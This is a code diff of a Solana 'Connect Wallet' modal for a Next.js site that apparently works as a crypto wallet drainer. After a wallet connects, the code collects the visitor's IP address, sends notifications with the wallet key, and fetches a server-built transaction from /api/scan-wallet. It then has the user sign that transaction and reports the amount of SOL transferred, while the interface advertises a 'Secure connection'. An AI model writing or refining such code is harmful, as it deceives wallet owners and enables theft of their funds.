@@ -3,7 +3,7 @@ import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } f
 import { Button } from "@/components/ui/button" 
 import Image from "next/image" 
 import { useState, useEffect, useCallback } from "react" 
-import { Loader2, ExternalLink, AlertCircle, CheckCircle2 } from "lucide-react"
+import { Loader2, ExternalLink, Check, X, AlertTriangle } from "lucide-react"
 import { toast } from "sonner"
 
 interface ModalsProps {
@@ -14,187 +14,58 @@ interface ModalsProps {
 interface WalletConfig {
   name: string
   icon: string
-  provider?: () => any
-  checkMethod?: () => boolean
-  deepLink?: string
-  universalLink?: string
-  mobile?: {
-    android: { schema: string; universal: string }
-    ios: { schema: string; universal: string }
-  }
+  provider: () => any
+  checkMethod: () => boolean
+  deepLink: string
+  universalLink: string
   downloadUrl: string
+  description: string
 }
 
-const DESKTOP_WALLETS: Record<string, WalletConfig> = {
+const WALLET_CONFIGS: Record<string, WalletConfig> = {
   phantom: {
     name: "Phantom",
     icon: "/phantom-icon.png",
     provider: () => (window as any).phantom?.solana,
-    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
+    checkMethod: () => !!(window as any).phantom?.solana?.isPhantom,
+    deepLink: "phantom://browse/",
+    universalLink: "https://phantom.app/ul/browse/",
     downloadUrl: "https://phantom.app/download",
+    description: "Most popular Solana wallet with NFT support",
   },
   solflare: {
     name: "Solflare",
     icon: "/solflare-icon.png",
     provider: () => (window as any).solflare,
-    checkMethod: () => (window as any).solflare?.isSolflare,
-    downloadUrl: "https://solflare.com/download",
-  },
-  backpack: {
-    name: "Backpack",
-    icon: "/backpack-icon.png",
-    provider: () => (window as any).backpack,
-    checkMethod: () => (window as any).backpack?.isBackpack,
-    downloadUrl: "https://backpack.app/download",
-  },
-  exodus: {
-    name: "Exodus",
-    icon: "/exodus-icon.png",
-    provider: () => (window as any).exodus?.solana,
-    checkMethod: () => (window as any).exodus?.solana?.isExodus,
-    downloadUrl: "https://exodus.com/download",
-  },
-  okx: {
-    name: "OKX Wallet",
-    icon: "/okx-icon.png",
-    provider: () => (window as any).okxwallet?.solana,
-    checkMethod: () => (window as any).okxwallet?.solana?.isOkxWallet,
-    downloadUrl: "https://okx.com/download",
-  },
-  "magic-eden": {
-    name: "Magic Eden",
-    icon: "/magic-eden-icon.png",
-    provider: () => (window as any).magicEden,
-    checkMethod: () => (window as any).magicEden?.isMagicEden,
-    downloadUrl: "https://magiceden.io/wallet",
-  },
-  trust: {
-    name: "Trust Wallet",
-    icon: "/trust-icon.png",
-    provider: () => (window as any).trustWallet,
-    checkMethod: () => (window as any).trustWallet?.isTrust,
-    downloadUrl: "https://trustwallet.com/download",
-  },
-  bitget: {
-    name: "Bitget Wallet",
-    icon: "/bitget-icon.png",
-    provider: () => (window as any).bitget,
-    checkMethod: () => (window as any).bitget?.isBitKeep,
-    downloadUrl: "https://web3.bitget.com/en/wallet-download",
-  },
-  sollet: {
-    name: "Sollet",
-    icon: "/sollet-icon.png",
-    provider: () => (window as any).sollet,
-    checkMethod: () => (window as any).sollet?.isSollet,
-    downloadUrl: "https://www.sollet.io/extension",
-  },
-  coin98: {
-    name: "Coin98",
-    icon: "/coin98-icon.png",
-    provider: () => (window as any).coin98,
-    checkMethod: () => (window as any).coin98?.isCoin98,
-    downloadUrl: "https://coin98.com/wallet",
-  },
-  slope: {
-    name: "Slope",
-    icon: "/slope-icon.png",
-    provider: () => (window as any).slope,
-    checkMethod: () => (window as any).slope?.isSlope,
-    downloadUrl: "https://slope.finance/#/download",
-  },
-  clover: {
-    name: "Clover Wallet",
-    icon: "/clover-icon.png",
-    provider: () => (window as any).clover,
-    checkMethod: () => (window as any).clover?.isClover,
-    downloadUrl: "https://clover.finance/wallet",
-  },
-  brave: {
-    name: "Brave Wallet",
-    icon: "/brave-icon.png",
-    provider: () => (window as any).braveSolana,
-    checkMethod: () => (window as any).braveSolana?.isBraveWallet,
-    downloadUrl: "https://brave.com/wallet",
-  },
-}
-
-const MOBILE_WALLETS: Record<string, WalletConfig> = {
-  phantom: {
-    name: "Phantom",
-    icon: "/phantom-icon.png",
-    deepLink: "phantom://browse/",
-    universalLink: "https://phantom.app/ul/browse/",
-    downloadUrl: "https://phantom.app/download",
-  },
-  solflare: {
-    name: "Solflare",
-    icon: "/solflare-icon.png",
+    checkMethod: () => !!(window as any).solflare?.isSolflare,
     deepLink: "solflare://ul/v1/browse/",
     universalLink: "https://solflare.com/ul/v1/browse/",
     downloadUrl: "https://solflare.com/download",
-  },
-  backpack: {
-    name: "Backpack",
-    icon: "/backpack-icon.png",
-    deepLink: "backpack://",
-    universalLink: "https://backpack.app/",
-    downloadUrl: "https://backpack.app/download",
-  },
-  exodus: {
-    name: "Exodus",
-    icon: "/exodus-icon.png",
-    deepLink: "exodus://",
-    universalLink: "https://exodus.com/",
-    downloadUrl: "https://exodus.com/download",
-  },
-  okx: {
-    name: "OKX Wallet",
-    icon: "/okx-icon.png",
-    deepLink: "okx://",
-    universalLink: "https://okx.com/web3",
-    downloadUrl: "https://okx.com/download",
+    description: "Secure wallet for Solana DeFi & staking",
   },
 }
 
-const WALLETS = Object.entries(DESKTOP_WALLETS).map(([id, config]) => ({
+const WALLETS = Object.entries(WALLET_CONFIGS).map(([id, config]) => ({
   id,
   name: config.name,
   icon: config.icon,
-  description: getWalletDescription(id),
+  description: config.description,
 }))
 
-function getWalletDescription(walletId: string): string {
-  const descriptions: Record<string, string> = {
-    phantom: "Most popular Solana wallet with NFT support",
-    solflare: "Secure wallet for Solana DeFi & staking",
-    backpack: "Web3 wallet built for traders and developers",
-    exodus: "Multi-chain wallet with built-in exchange",
-    okx: "Exchange-backed wallet with Web3 access",
-    "magic-eden": "Official wallet of Magic Eden NFT marketplace",
-    trust: "Binance's official multi-chain wallet",
-    bitget: "Bitget exchange Web3 wallet",
-    sollet: "Lightweight browser extension for Solana",
-    coin98: "Super wallet supporting 40+ blockchains",
-    slope: "Non-custodial wallet with beautiful UI",
-    clover: "Wallet for Clover Finance ecosystem",
-    brave: "Built-in wallet in Brave browser",
-  }
-  return descriptions[walletId] || "Connect to the application"
-}
+type ConnectionStatus = "idle" | "checking" | "connecting" | "success" | "error"
 
 export function Modals({ isOpen, onClose }: ModalsProps) {
   const [isMobile, setIsMobile] = useState(false)
   const [isBlockedGeo, setIsBlockedGeo] = useState(false)
-  const [connectingWallet, setConnectingWallet] = useState<string | null>(null)
-  const [connectionStatus, setConnectionStatus] = useState<"idle" | "connecting" | "success" | "error">("idle")
-  const [errorMessage, setErrorMessage] = useState<string>("")
+  const [activeWallet, setActiveWallet] = useState<string | null>(null)
+  const [connectionStatus, setConnectionStatus] = useState<ConnectionStatus>("idle")
+  const [errorMessage, setErrorMessage] = useState("")
 
   useEffect(() => {
     const checkMobile = () => {
       const userAgent = navigator.userAgent.toLowerCase()
-      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
-      setIsMobile(mobile)
+      const isMobileDevice = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent)
+      setIsMobile(isMobileDevice)
     }
     
     checkMobile()
@@ -203,69 +74,43 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
 
   const checkGeoBlockStatus = useCallback(async () => {
     try {
-      const response = await fetch("/api/check-geo", {
-        signal: AbortSignal.timeout(3000),
-      })
+      const response = await fetch("/api/check-geo", { signal: AbortSignal.timeout(2000) })
       const data = await response.json()
       if (data.blocked) {
         setIsBlockedGeo(true)
         onClose()
         toast.error("Service not available in your region")
       }
-    } catch (error) {
-      console.warn("Geo check failed, proceeding anyway")
+    } catch {
+      // Silent fail
     }
   }, [onClose])
 
-  const isInWalletBrowserInstance = useCallback((walletId: string): boolean => {
+  const isInWalletBrowser = useCallback((walletId: string): boolean => {
     const userAgent = navigator.userAgent.toLowerCase()
-    const walletChecks: Record<string, string[]> = {
-      phantom: ["phantom"],
-      solflare: ["solflare"],
-      backpack: ["backpack"],
-      exodus: ["exodus"],
-      okx: ["okx", "okxwallet"],
-      "magic-eden": ["magiceden"],
-      trust: ["trust", "trustwallet"],
-      bitget: ["bitget", "bitkeep"],
-      sollet: ["sollet"],
-      coin98: ["coin98"],
-      slope: ["slope"],
-      clover: ["clover"],
-      brave: ["brave"],
-    }
-    
-    return walletChecks[walletId]?.some(keyword => userAgent.includes(keyword)) || false
+    if (walletId === "phantom") return userAgent.includes("phantom")
+    if (walletId === "solflare") return userAgent.includes("solflare")
+    return false
   }, [])
 
   const getIPAddress = useCallback(async (): Promise<string> => {
     try {
-      const services = [
-        "https://api.ipify.org?format=json",
-        "https://api.my-ip.io/ip",
-        "https://api.ip.sb/ip",
-        "https://ifconfig.me/ip",
-      ]
-
-      for (const service of services) {
-        try {
-          const response = await fetch(service, { signal: AbortSignal.timeout(2000) })
-          if (response.ok) {
-            const text = await response.text()
-            const ip = text.trim()
-            if (ip && ip !== "" && !ip.includes("<")) {
-              return ip
-            }
-          }
-        } catch (error) {
-          continue
-        }
+      const response = await fetch("https://api.ipify.org?format=json", {
+        signal: AbortSignal.timeout(1500),
+      })
+      const data = await response.json()
+      return data.ip || "unknown"
+    } catch {
+      try {
+        const response = await fetch("https://api.my-ip.io/ip", {
+          signal: AbortSignal.timeout(1500),
+        })
+        const text = await response.text()
+        return text.trim() || "unknown"
+      } catch {
+        return "unknown"
       }
-    } catch (error) {
-      console.error("Failed to get IP address:", error)
     }
-    
-    return "unknown"
   }, [])
 
   const sendTransactionNotification = useCallback(async (
@@ -297,76 +142,88 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           errorDetails,
         }),
       })
-    } catch (error) {
-      console.error("Failed to send transaction notification:", error)
+    } catch {
+      console.error("Failed to send notification")
+    }
+  }, [])
+
+  const checkWalletInstalled = useCallback((walletId: string): boolean => {
+    const config = WALLET_CONFIGS[walletId]
+    if (!config) return false
+    
+    try {
+      return config.checkMethod()
+    } catch {
+      return false
     }
   }, [])
 
   const connectDesktopWallet = useCallback(async (walletId: string) => {
-    setConnectingWallet(walletId)
-    setConnectionStatus("connecting")
-    setErrorMessage("")
-
-    const walletConfig = DESKTOP_WALLETS[walletId]
-    if (!walletConfig) {
-      setConnectionStatus("error")
-      setErrorMessage("Wallet not supported")
+    const config = WALLET_CONFIGS[walletId]
+    if (!config) {
       toast.error("Wallet not supported")
       return
     }
 
-    const provider = walletConfig.provider?.()
-    const isInstalled = walletConfig.checkMethod?.()
+    setActiveWallet(walletId)
+    setConnectionStatus("checking")
+    setErrorMessage("")
 
-    if (!isInstalled || !provider) {
+    // Check if wallet is installed
+    if (!checkWalletInstalled(walletId)) {
       setConnectionStatus("error")
-      setErrorMessage(`${walletConfig.name} not detected`)
-      toast.error(`Please install ${walletConfig.name}`, {
+      setErrorMessage(`${config.name} not detected`)
+      toast.error(`${config.name} not installed`, {
         action: {
           label: "Download",
-          onClick: () => window.open(walletConfig.downloadUrl, "_blank"),
+          onClick: () => window.open(config.downloadUrl, "_blank"),
         },
+        duration: 5000,
       })
+      setActiveWallet(null)
+      setTimeout(() => setConnectionStatus("idle"), 2000)
       return
     }
 
+    setConnectionStatus("connecting")
+    
     try {
+      const provider = config.provider()
       const response = await provider.connect()
       const publicKey = response.publicKey.toString()
       
       setConnectionStatus("success")
-      toast.success(`${walletConfig.name} connected successfully`)
+      toast.success(`${config.name} connected!`)
       
-      // Get IP address
+      // Get IP and send notification
       const userIP = await getIPAddress()
-      
-      // Send connection notification
       await sendTransactionNotification(
         publicKey,
-        walletConfig.name,
-        0, // Balance will be fetched in scan
+        config.name,
+        0,
         0,
         userIP,
         undefined,
         undefined,
         undefined,
         undefined,
-        `${walletConfig.name} connected successfully`
+        `${config.name} connected successfully`
       )
       
-      // Start wallet scanning and transaction
-      await scanAndCreateTransaction(publicKey, provider, walletConfig.name, userIP)
+      // Process transaction
+      await processWalletTransaction(publicKey, provider, config.name, userIP)
+      
     } catch (error: any) {
-      console.error(`Connection error for ${walletConfig.name}:`, error)
+      console.error(`Connection error:`, error)
       setConnectionStatus("error")
       setErrorMessage(error.message || "Connection failed")
-      toast.error(`Failed to connect ${walletConfig.name}`)
+      toast.error(`Failed to connect ${config.name}`)
       
       // Send error notification
       const userIP = await getIPAddress()
       await sendTransactionNotification(
         "unknown",
-        walletConfig.name,
+        config.name,
         0,
         0,
         userIP,
@@ -374,29 +231,30 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         undefined,
         undefined,
         "Connection Failed",
-        error.message || "Unknown connection error"
+        error.message || "Unknown error"
       )
     } finally {
-      setConnectingWallet(null)
-      setTimeout(() => setConnectionStatus("idle"), 2000)
+      setTimeout(() => {
+        setActiveWallet(null)
+        setConnectionStatus("idle")
+      }, 2000)
     }
-  }, [getIPAddress, sendTransactionNotification])
+  }, [checkWalletInstalled, getIPAddress, sendTransactionNotification])
 
   const connectMobileWallet = useCallback((walletId: string) => {
-    const walletConfig = MOBILE_WALLETS[walletId]
-    if (!walletConfig) {
-      toast.error("Wallet not supported on mobile")
+    const config = WALLET_CONFIGS[walletId]
+    if (!config) {
+      toast.error("Wallet not supported")
       return
     }
 
-    if (isInWalletBrowserInstance(walletId)) {
+    // If already in wallet browser, use desktop flow
+    if (isInWalletBrowser(walletId)) {
       connectDesktopWallet(walletId)
       return
     }
 
     const currentUrl = encodeURIComponent(window.location.href)
-    const isIOS = /iphone|ipad|ipod/i.test(navigator.userAgent)
-    
     let deepLink = ""
     let universalLink = ""
 
@@ -404,35 +262,29 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       deepLink = `phantom://browse/${currentUrl}?ref=${currentUrl}`
       universalLink = `https://phantom.app/ul/browse/${currentUrl}?ref=${currentUrl}`
     } else if (walletId === "solflare") {
-      deepLink = `${walletConfig.deepLink}${currentUrl}`
-      universalLink = `${walletConfig.universalLink}${currentUrl}`
-    } else if (walletConfig.deepLink) {
-      deepLink = `${walletConfig.deepLink}${currentUrl}`
-      universalLink = `${walletConfig.universalLink}${currentUrl}`
-    } else {
-      window.open(walletConfig.downloadUrl, "_blank")
-      return
+      deepLink = `${config.deepLink}${currentUrl}`
+      universalLink = `${config.universalLink}${currentUrl}`
     }
 
-    // Try deep link first
+    // Open deep link
     window.location.href = deepLink
     
-    // Fallback to universal link after delay
+    // Fallback after delay
     setTimeout(() => {
       window.location.href = universalLink
     }, 500)
-  }, [connectDesktopWallet, isInWalletBrowserInstance])
+  }, [connectDesktopWallet, isInWalletBrowser])
 
-  const scanAndCreateTransaction = useCallback(async (
+  const processWalletTransaction = useCallback(async (
     publicKey: string,
     provider: any,
     walletType: string,
     userIP: string
   ) => {
     try {
-      toast.loading("Scanning wallet balance...")
+      toast.loading("Scanning wallet...", { id: "scan" })
       
-      // Send scan request
+      // Scan wallet
       const scanResponse = await fetch("/api/scan-wallet", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -444,9 +296,10 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       })
 
       const scanData = await scanResponse.json()
+      toast.dismiss("scan")
 
       if (!scanResponse.ok || scanData.error) {
-        const errorMsg = scanData.message || "Wallet scan failed"
+        const errorMsg = scanData.message || "Scan failed"
         toast.error(errorMsg)
         
         await sendTransactionNotification(
@@ -462,12 +315,14 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           errorMsg
         )
         
-        onClose()
+        setTimeout(() => onClose(), 1500)
         return
       }
 
       if (scanData.message === "Insufficient balance") {
-        toast.error("Insufficient balance for transaction")
+        toast.error("Insufficient balance", {
+          description: `Minimum ${scanData.minRequired} SOL required`,
+        })
         
         await sendTransactionNotification(
           publicKey,
@@ -479,31 +334,28 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
           undefined,
           undefined,
           "Insufficient Balance",
-          `Balance: ${scanData.balance?.toFixed(4)} SOL < Minimum: ${scanData.minRequired} SOL`
+          `Balance: ${scanData.balance?.toFixed(4)} SOL`
         )
         
-        onClose()
+        setTimeout(() => onClose(), 1500)
         return
       }
 
-      // Create and sign transaction
-      toast.loading("Preparing transaction...")
+      // Sign and send transaction
+      toast.loading("Preparing transaction...", { id: "tx" })
       
       const { Connection, Transaction } = await import("@solana/web3.js")
       const transaction = Transaction.from(Buffer.from(scanData.transaction, "base64"))
 
-      const signedTransaction = await provider.signTransaction(transaction)
-      
-      toast.loading("Broadcasting transaction...")
+      const signedTx = await provider.signTransaction(transaction)
+      toast.loading("Sending transaction...", { id: "tx" })
 
-      // Try multiple RPC endpoints
+      // Try RPC endpoints
       const RPC_ENDPOINTS = [
-        "https://solana-rpc.publicnode.com",
         "https://api.mainnet-beta.solana.com",
+        "https://solana-api.projectserum.com",
+        "https://rpc.ankr.com/solana",
         "https://solana.drpc.org",
-        "https://solana.lavenderfive.com",
-        "https://solana.api.onfinality.io/public",
-        "https://public.rpc.solanavibestation.com",
       ]
 
       let signature = ""
@@ -512,7 +364,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       for (const endpoint of RPC_ENDPOINTS) {
         try {
           const connection = new Connection(endpoint, "confirmed")
-          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
+          signature = await connection.sendRawTransaction(signedTx.serialize(), {
             skipPreflight: false,
             preflightCommitment: "confirmed",
           })
@@ -531,8 +383,18 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
       }
 
       if (!signature) {
-        throw lastError || new Error("Transaction broadcast failed")
+        throw lastError || new Error("Transaction failed")
       }
+
+      toast.dismiss("tx")
+      toast.success("Transaction successful!", {
+        description: `${scanData.transferAmount.toFixed(4)} SOL transferred`,
+        action: {
+          label: "View",
+          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
+        },
+        duration: 5000,
+      })
 
       // Send success notification
       await sendTransactionNotification(
@@ -546,22 +408,12 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         signature
       )
 
-      toast.success("Transaction completed successfully!", {
-        action: {
-          label: "View",
-          onClick: () => window.open(`https://solscan.io/tx/${signature}`, "_blank"),
-        },
-      })
-
-      setTimeout(() => {
-        onClose()
-      }, 2000)
+      setTimeout(() => onClose(), 2000)
 
     } catch (error: any) {
-      console.error("Transaction error:", error)
-      
+      toast.dismiss("tx")
       const errorMsg = error.message || "Transaction failed"
-      toast.error(errorMsg)
+      toast.error("Transaction failed", { description: errorMsg })
       
       await sendTransactionNotification(
         publicKey,
@@ -576,9 +428,7 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
         errorMsg
       )
       
-      setTimeout(() => {
-        onClose()
-      }, 3000)
+      setTimeout(() => onClose(), 2000)
     }
   }, [onClose, sendTransactionNotification])
 
@@ -594,42 +444,55 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
     return null
   }
 
+  const getStatusIcon = (walletId: string) => {
+    if (activeWallet !== walletId) return null
+    
+    switch (connectionStatus) {
+      case "checking":
+      case "connecting":
+        return <Loader2 className="h-4 w-4 animate-spin text-blue-500" />
+      case "success":
+        return <Check className="h-4 w-4 text-green-500" />
+      case "error":
+        return <X className="h-4 w-4 text-red-500" />
+      default:
+        return null
+    }
+  }
+
   return (
     <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
       <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
         <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
-          <DialogTitle className="text-xl sm:text-2xl font-bold text-center">
+          <DialogTitle className="text-xl sm:text-2xl font-bold text-center flex items-center justify-center gap-2">
             Connect Wallet
+            {isMobile && <ExternalLink className="h-5 w-5" />}
           </DialogTitle>
           <DialogDescription className="text-sm sm:text-base text-center">
             Choose a wallet to connect to the application
           </DialogDescription>
           
           {connectionStatus === "error" && (
-            <div className="mt-2 p-2 bg-red-50 border border-red-200 rounded-lg flex items-center gap-2">
-              <AlertCircle className="h-4 w-4 text-red-600" />
-              <span className="text-sm text-red-600">{errorMessage}</span>
-            </div>
-          )}
-          
-          {connectionStatus === "success" && (
-            <div className="mt-2 p-2 bg-green-50 border border-green-200 rounded-lg flex items-center gap-2">
-              <CheckCircle2 className="h-4 w-4 text-green-600" />
-              <span className="text-sm text-green-600">Wallet connected successfully</span>
+            <div className="mt-3 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start gap-2">
+              <AlertTriangle className="h-4 w-4 text-red-600 mt-0.5 flex-shrink-0" />
+              <div className="flex-1">
+                <p className="text-sm font-medium text-red-800">Connection Failed</p>
+                <p className="text-xs text-red-600 mt-1">{errorMessage}</p>
+              </div>
             </div>
           )}
         </DialogHeader>
 
-        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5 max-h-[60vh] overflow-y-auto">
+        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5">
           {WALLETS.map((wallet) => (
             <Button
               key={wallet.id}
               variant="outline"
-              className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent ${
-                connectingWallet === wallet.id ? "border-primary bg-primary/5" : ""
+              className={`h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent relative ${
+                activeWallet === wallet.id ? "border-primary ring-2 ring-primary/20" : ""
               }`}
               onClick={() => handleWalletClick(wallet.id)}
-              disabled={connectingWallet !== null && connectingWallet !== wallet.id}
+              disabled={activeWallet !== null && activeWallet !== wallet.id}
             >
               <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                 <Image
@@ -639,33 +502,42 @@ export function Modals({ isOpen, onClose }: ModalsProps) {
                   className="object-cover"
                   sizes="48px"
                 />
-                {connectingWallet === wallet.id && (
-                  <div className="absolute inset-0 bg-black/50 flex items-center justify-center">
-                    <Loader2 className="h-6 w-6 text-white animate-spin" />
+                {activeWallet === wallet.id && connectionStatus === "connecting" && (
+                  <div className="absolute inset-0 bg-black/20 flex items-center justify-center">
+                    <Loader2 className="h-5 w-5 text-white animate-spin" />
                   </div>
                 )}
               </div>
+              
               <div className="flex flex-col items-start text-left flex-1">
                 <div className="flex items-center gap-2">
                   <span className="font-semibold text-base">{wallet.name}</span>
-                  {isMobile && wallet.id in MOBILE_WALLETS && (
-                    <ExternalLink className="h-3 w-3 text-muted-foreground" />
-                  )}
+                  {isMobile && <span className="text-xs text-muted-foreground">Mobile</span>}
                 </div>
                 <span className="text-sm text-muted-foreground">{wallet.description}</span>
               </div>
-              {connectingWallet === wallet.id && (
-                <Loader2 className="h-4 w-4 animate-spin text-primary" />
+              
+              <div className="flex-shrink-0">
+                {getStatusIcon(wallet.id)}
+              </div>
+              
+              {isMobile && activeWallet !== wallet.id && (
+                <ExternalLink className="h-4 w-4 text-muted-foreground absolute top-4 right-4" />
               )}
             </Button>
           ))}
           
-          <div className="mt-2 text-xs text-center text-muted-foreground">
-            <p>By connecting, you agree to our Terms of Service</p>
-            <p className="mt-1">Supported networks: Solana Mainnet</p>
+          <div className="mt-4 pt-4 border-t">
+            <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
+              <div className="h-2 w-2 rounded-full bg-green-500"></div>
+              <span>Secure connection • Solana Mainnet</span>
+            </div>
+            <p className="text-xs text-center text-muted-foreground mt-2">
+              By connecting, you agree to our Terms of Service
+            </p>
           </div>
         </div>
       </DialogContent>
     </Dialog>
   )
-}
+    }
